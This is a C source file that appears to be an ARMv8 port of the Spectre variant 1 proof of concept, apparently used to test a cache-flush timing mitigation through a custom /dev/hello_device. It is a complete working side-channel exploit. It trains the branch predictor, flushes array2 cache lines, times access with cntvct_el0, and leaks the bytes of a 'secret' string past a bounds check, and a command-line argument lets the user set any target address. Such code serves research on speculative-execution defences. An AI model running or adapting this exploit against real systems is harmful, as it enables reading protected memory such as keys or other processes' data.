#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include<sys/ioctl.h>
#include<assert.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <time.h>


#define TRAP 0
#define FLUSHTIME_ENABLE 0


void
arm_v8_access_memory(void* pointer)
{
  volatile uint32_t value;
  asm volatile ("LDR %0, [%1]\n\t"
      : "=r" (value)
      : "r" (pointer)
      );
}

void
arm_v8_memory_barrier(void)
{
  asm volatile ("DSB SY");
  asm volatile ("ISB");
}

void arm_v8_flush(void* address)
{
  asm volatile ("DC CIVAC, %0" :: "r"(address));
  asm volatile ("DSB ISH");
  asm volatile ("ISB");
}


uint64_t
arm_v8_get_timing(void)
{
	// struct timespec time = {0, 0};
	// clock_gettime(CLOCK_REALTIME, &time);
	// return time.tv_nsec;
	
	asm volatile ("DSB ISH");
	asm volatile ("ISB");	
	uint64_t res;	
	asm volatile("mrs %0, cntvct_el0" : "=r" (res) :: "memory");
	return res;			
}

unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160]={1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256*512];
                          
char *secret =  "###########"
			    "##### #####"
			    "####   ####"
			    "###     ###"
			    "##       ##"
			    "###     ###"
			    "####   ####"
			    "##### #####"
			    "###########";

uint8_t temp = 0;    /* Used so compiler won’t optimize out victim_function() */

void victim_function(size_t x) {
	if (x < array1_size) {
		temp &= array2[array1[x] * 512];
	}
}



#if TRAP==0
#define CACHE_HIT_THRESHOLD (4)    //no trap
#endif


#if TRAP==1
#define CACHE_HIT_THRESHOLD (15)  //trap
#endif


void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
	static int results[256];
	int tries, i, j, k, mix_i, junk = 0;
	size_t training_x, x;
	unsigned long time1,time2,time3;
	volatile uint8_t *addr;
	volatile int z;	
		
	
	for (i = 0; i < 256; i++)
		results[i] = 0;	
	
	for (tries = 99; tries > 0; tries--) {
		for(i=0;i<256;i++)
		{
			arm_v8_flush(&array2[i*512]);
		}	
		
		training_x = tries % array1_size;
		
		for (j = 29; j >= 0; j--) {
			arm_v8_flush(&array1_size);
			for (z = 0; z < 100; z++) {}
			
			x = ((j % 16) - 1) & ~0xFFFF;
			x = (x | (x >> 16));
			x = training_x ^ (x & (malicious_x ^ training_x));
			victim_function(x);
		}

		for (i = 0; i < 256; i++) {
			mix_i = ((i * 167) + 13) & 255;
			addr = &array2[mix_i * 512];
			
			time1=arm_v8_get_timing();

			junk = *addr;
			time2=arm_v8_get_timing();
			
			time3=time2-time1;
			
			//printf("time3=%lx\n",time3);
			
			if (time3 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
				results[mix_i]++;
		}
		//printf("time3=%lx\n",time3);
		
		j = k = -1;
		for (i = 0; i < 256; i++) {
			if (j < 0 || results[i] >= results[j]) {
				k = j;
				j = i;
			} 
			else if (k < 0 || results[i] >= results[k]) {
				k = i;
			}
		}
		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
		break;		
	}
	results[0] ^= junk;
	value[0] = (uint8_t)j;
	score[0] = results[j];
	value[1] = (uint8_t)k;
	score[1] = results[k];
	
}

int main(int argc, const char **argv) {
	size_t malicious_x=(size_t)(secret-(char*)array1); /* default for malicious_x */	
	int fd, i, score[2], len=99,correct_number=0;
	uint8_t value[2];

	
	fd = open("/dev/hello_device", O_RDWR);
	printf("fd=%lx\n",fd);


#if FLUSHTIME_ENABLE==0	
	read(fd,0,0);  // FlushTime_enable==0
	printf("FLUSHTIME_ENABLE==0\n");
#endif

#if FLUSHTIME_ENABLE==1
	read(fd,0,10);	// FlushTime_enable==0xdeadbeaf
	printf("FLUSHTIME_ENABLE==1\n");
#endif
	
	for (i = 0; i < sizeof(array2); i++)
		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
	if (argc == 3) {
		sscanf(argv[1], "%p", (void**)(&malicious_x));
		malicious_x -= (size_t)array1; /* Convert input value into a pointer */
		sscanf(argv[2], "%d", &len);
	}
	
	correct_number=0;
	printf("Reading %d bytes:\n", len);
	while (--len >= 0) {
		// printf("Reading at malicious_x = %p... ", (void*)malicious_x);
		// readMemoryByte(malicious_x++, value, score);
		// printf("%s: ", (score[0] >= 2*score[1] ? "Success" : "Unclear"));
		// printf("0x%02X=’%c’ score=%d ", value[0],
			// (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
		// if (score[1] > 0)
			// printf("(second best: 0x%02X score=%d)", value[1], score[1]);
		// printf("\n");

		
		readMemoryByte(malicious_x++, value, score);
		if(value[0]==secret[99-len-1])
			{
				correct_number=correct_number+1;
				printf("%c",value[0]);
			}
			else
			{
				printf("?");
			}	
			if(len%11==0)
				printf("\n");
		
	}

	
		printf("correct_number=%d\n",correct_number);
	return (0);
}






